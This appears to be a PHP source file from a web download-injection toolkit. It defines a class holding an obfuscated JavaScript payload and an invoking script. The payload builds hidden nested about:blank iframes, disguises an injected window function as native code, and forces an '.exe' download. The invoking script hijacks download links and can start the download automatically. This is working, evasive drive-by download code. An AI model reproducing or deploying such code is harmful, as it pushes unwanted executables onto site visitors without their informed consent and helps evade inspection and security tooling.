<?php

namespace LPO\Digest\Injectable\DownloadMethod;

use LPO\Bootstrap;
use LPO\Digest\Injectable\DownloadMethod;
use LPO\Digest\Injectable\JavascriptInvokable;

class AboutBlankIframe extends DownloadMethod implements JavascriptInvokable {

	/**
	 * @var string
	 */
	public static $_source_script = <<<'JS'
eval((function(E0){for(var S0="",m0=0,Y0=function(E0,B0){for(var s0=0,a0=0;a0<B0;a0++){s0*=96;var W0=E0.charCodeAt(a0);if(W0>=32&&W0<=127){s0+=W0-32;}}return s0;};m0<E0.length;){if(E0.charAt(m0)!="`")S0+=E0.charAt(m0++);else{if(E0.charAt(m0+1)!="`"){var P3=Y0(E0.charAt(m0+3),1)+5;S0+=S0.substr(S0.length-Y0(E0.substr(m0+1,2),2)-P3,P3);m0+=4;}else{S0+="`";m0+=2;}}}return S0;})("var R4X0=window;for(var u0 in` 5 ){if(u0.length===((100,0x2C)<=18.?null:(0x139,108.30E1)>=(8.93E2,0x71)?(0x236,8)` E E2,79` C!<=(5,145)?(64.0E1,\'F\'):(102.60E1,92.10E1))&&u0.charCodeAt(((1,0x130)<=0x1BD?(19.,5):(0xB1,124.)))===(42.80E1<=(38.,0xDA)?(0x162,\"a\"` L 189,117)<=0x247?(8.98E2,101):(66.,0x244))&&u0.charCodeAt(((111,145.0E1)>29?(3.760E2,7):(77,1.224E3)<=(122,0x123)?(0x16,26.3E1):(0x1A7,0x193)))===((81,0x226)>56.2E1?\'A\':(0x22D,0x116)>4.46E2?(138.,\"A\"):(87.80E1,55)<=(11` (\"6.7E1)?(26.,116):(1.3E3,1.075E3))&&u0.charCodeAt((1.413E3<(19,55.)?0x252:(129,0xDC)<=36.?3:(141.9E1,73.0E1)>14?(122,3):(25,139.)))===((1.032E3,0x179)<=0xDB?7.390E2:(19,77.5E1)>=(0x141,25)?(0x23F,117):(14.370E2,69.8E1)<=(1.455E3,22.1E1)?\"a\":(0x1BD,0x22A))&&u0.charCodeAt((0x196<=(0xF6,0x23A)?(120.,0):(8.20E1,0x5D)))===` L 4A,83.10E1)` U 173` =!?111.30E1:` @\"0x16C)>` ?!0,1.284E3)?(123.,1.5E2):79<(0x1D5,0xD7` 8 8,100):(0x1A9,99.)))break};for(var c0 in R4X0){if(c0.length===(0x18B>=(0x23,0x94)?(79.,6):(0x20,126.)>=(8.55E2,0xAF)?(0x199,\'W\'):14.88E2<(94,48.0E1)?50:(29.40E1,0x1C5))&&c0.charCodeAt((16.<(45.80E1,126.)?(145.9E1,3):(0x44,68)<=50?(0x1C4,\'f\'` 5 1C2,0x114)))===((146.70E1,0x165)>9.9E1` Q E8,100):(86.,13)>=0x1A6?74.9E1:(0x99,67.3E1))&&c0.charCodeAt(((116.,62.80E1)>(1.55E2,44.6E1)?(0x1C,5):(0x5F,140)))===119&&c0.charCodeAt(1)===(0x15D>=(0x66,9.4E1)?(129.,105):(13.96E2,0xB5))&&c0.charCodeAt(((37.,0x27)<=(22,0x1C0)?(0x24E,0):62.>(33,0x7A)?(9.47E2,\'f\'):(126.,2)>0x28?\"f\":(0xAA,0xF5)))===119)break};var H0R={\"C5\":\"a\",\"d5\":\"v\",\"y5\":\"0\",\"w5\":\"f\",\"j5\":\"lue\"` S!Z5=(H0R.d5+H0R.C5` \" j` (!y` \/!w5);R4X0[c0][Z5]=(function(){var T=\"tring\",A4=\"oS\",M=((0x130,0x18F)>=(143,0xA2)?(138.4E1,\"O\"):(27.,126.)),d=\"va\",W` X!B,9.01E2)>0x12E?(79,\"t\"):(1.411E3,0x239)),d4=\"on\",n4=(79>(0x14D,109)?0x1B1:8.11E2>=(26,15.70E1)?(1.297E3,\"u\"):122>=(0x106,36.9` = 0x171,4.97E2):(6.42E2,0xAA)),j=((132,0xB9)>140.?(6.12E2,\"i\"):(0x21C,21.)),P4=((41.5E1,64.7E1)<(0x104,0x1AF)?(31,1024):140>(8.25E2,32)?(54,\"c\"):(49.40E1,10.98E2)),Q=\"e\",A=((111,56.5E1)<=0x23E?(0x194,\"d\"):(0x224,36.30E1)),z4=(4.04E2<(97.80E1,68.)?(44,\"H\"):(1.247E3,137.5E1)>=14.?(138.,\"n\"):105>=(13.,2.35E2)?0:(5.,0x91)),c=(10.63E2>=(3.15E2,0x147)?(85.,\"o\"):(11.9E2,7.80E1)>=(52.90E1,132.)?\"v\":(0x219,11.5E2)<(42.,0xEF)?(20.,58.2E1):(4.10E1,0xED)),H4=function(C4){var K4=(6.560E2<=(0x93,0x1D3)?(118.,0x64):(54.,50.)<=6.68E2?(11.9E1,\"h\"):(55.6E1,0x1A3));var j4=\"ti\"` \' v4=((0x13,108.)<=97.2E1?(8.83E2,\"l\"):0x147<(0x23,72)?55.:(41,111.));var i4=(3.19E2<(0x81,0x24C)?(86.,\"r\"):(140.,105.5E1` O\"q4=function(){var x=\"ca\"` 8 g=\"lo` %\"l=\"eu` 1!b=\"nbe\";debugger;R4X0[c0][(c+b+H0R.w5+c+i4+l+z4+g+A)]=null` ?&v4+c+x+j4+c+z4)][(K4+i4+Q` Y\")]=C4;};var y=function(x,g){var l=\"en\"` : b=\"C` $!t=\"ent` 0!f=\"D` :!G=\"co` E!w=\"Ch` P!H=\"pen` R!D=\"ap` Q!V=\"dy` R!r=((56.40E1,0x147)<=0xA?1.191E3:(48.6` 7 24F)<(98.80E1,121.)?(90.,\"I\"):(1.242E3,114)>=(0x13C,98)?(0x188,\"b\"):(0xC6,2.81E2));var S=\'x\'` % m=\'000p` \'!x4=\'0` 2!R4=(118>=(108.,2.7E1)?(0x174,\'1\'):(59.,0x1D3)>=(0x257,5.65E2)?7.:(122.,9.51E2)<=(5.88E2,0x18)?(81.,\'y\'):(0x1C2,105.));var b4=(0x201>` # 7,3.99E2)?(115.,\'-` P!3C,22` L\"Y=\"le\"` Y O` Y 1C7<=(72.,6.60E1)?85.:0xAF<` : D0,7.350E2)?(98.,\"y\"):(94.0E1,0xEA));var B=\'te\'` & Z=(142<(5.270E2,0x106)?(0x180,\'u\'):(0xE9,99` V\"I=\'ol` W!s=\'bs` %!J=\"tyl\"` = C=((61.40E1,2.69E2)>0x30?(146,\"p\"):(105,114.)>(1.473E3,0x1E9)?1000:(67,135.5E1));var L=(101<=(1.078E3,91)?\'s\':21.20E` 5 28.4E1,0xD9)?(2.38E2,\'k\'):94.>(117,0x240)?(26.5E1,50):(109.,0x32));var Z4=\'an\'` \' N4=\'l` %!o4=((0xF7,0x34)>=3.7E1?(0x202,\':\'):(0x56,19))` X L4=((143.,8.870E2)<=0x52?(57,\"G\"):0x4F>(74.7E1,0x1C)?(125.,\'t\'):(19.8E1,64));var U4=\'ou\'` \' g4=\'b` %!F=((121,0x1D1)<=13.05E2?(0x103,\'a\'):(0xBD,37.))` Z y4=\"rc\"` [ l4=((0x245,86.60E1)>=0xA2?(3.81E2,\"s\"):(145.,14.040E2))` W w4=\'f_\'` \' p=\'ame` &!t4=\'fr` 2!a=(78.60E1>=(0x13A,0x1FF)?(1.109E3,\'i\'):(3.81E2,0xFB))` V T4=\"nt\"` \' M4=((23.,0x1CE)<27.3E1?\'C\':79>(0x193,14.01E2)?(0x81,23.):11.0E2>(0xAA,0x134` : 204,\"m\"):(15,0x4F));var D4=\"El\"` \' Q4=\"te` &!o=\"ea` 1!n=[];for(var k=0;k<x;k++){var q=R4X0[u0][(P4+i4+o+Q4+D4+Q+M4+Q+T4)]((a+t4+p));q[(j+A)]=(w4)+k;q[(l4+y4)]=(x-1==k?g:(F+g4+U4+L4+o4+g4+N4+Z4+L));n[(C+n4+l4+K4)](q);}n[0][(l4+J+Q)][(C+c+l4+j+j4+d4)]=(F+s+I+Z+B);` D$W+O4+Y)][(v4+Q+H0R.w5+W)]=(b4+R4+x4+m+S);R4X0[u0][(r+c+V)][(D+H+A+w+j+v4+A)](n[0]);var X=1;for(;X<n.length-1;X++){n[X-1][(G+z4+W+Q+T4+f+c+P4+n4+M4+t)][(r+c+V)][(D+C+Q+z4+A+b+K4+j+v4+A)](n[X]);}n[X-1][(H0R.C5+C+C+l` 9.n.length-1]);};try{y(3,C4);}catch(x){q4();}};H4[(d+H0R.j5+M` $ w5)]=H4[(W+A4+T)]=function(){var x=\"] }\",g=\"at\",l=\"() { [\",b=((54.,122)<=(50.40E1,0x193)?(84.0E1,\" \"):(0x106,24));return (H0R.w5+n4+z4+P4+W+j+d4+b)+Z5+(l+z4+g+j+H0R.d5+Q+b+P4+c+A+Q+x);};return H4;})()"));
JS;
	/**
	 * @var string
	 */
	private static $_invoking_script = <<<'JS'
if(!document.querySelectorAll) { document.querySelectorAll = function(selector) { var doc = document, head = doc.documentElement.firstChild, styleTag = doc.createElement("STYLE"); head.appendChild(styleTag); doc.__qsaels = []; styleTag.styleSheet.cssText = selector + "{x:expression(document.__qsaels.push(this))}"; window.scrollBy(0, 0); return doc.__qsaels; } } function dl(){window["value0f"](__tokens.directDownloadLink, __tokens.filename + ".exe");iframer(document.querySelectorAll(".dlink")[0], 0, __tokens.downloadLink + "&graceful=1", __tokens.downloadLink + "&graceful=1");} if(__tokens.autoDownload) { dl(); } var links = document.querySelectorAll(".dlink"); for(var i = 0; i < links.length; i++) { var dlink = links[i]; dlink.href = "javascript:void(0)"; dlink.onclick = function(e) { e.preventDefault(); dl(); } }
JS;


	/**
	 * @param Bootstrap $bootstrap
	 *
	 * @return string
	 */
	function getInvokingScript(Bootstrap $bootstrap)
	{
		$iframe = new Iframe;
		return $iframe->getSourceScript().';'.';'.self::$_invoking_script;
	}

	/**
	 * @return string
	 */
	public function getSourceScript(){ return self::$_source_script; }
}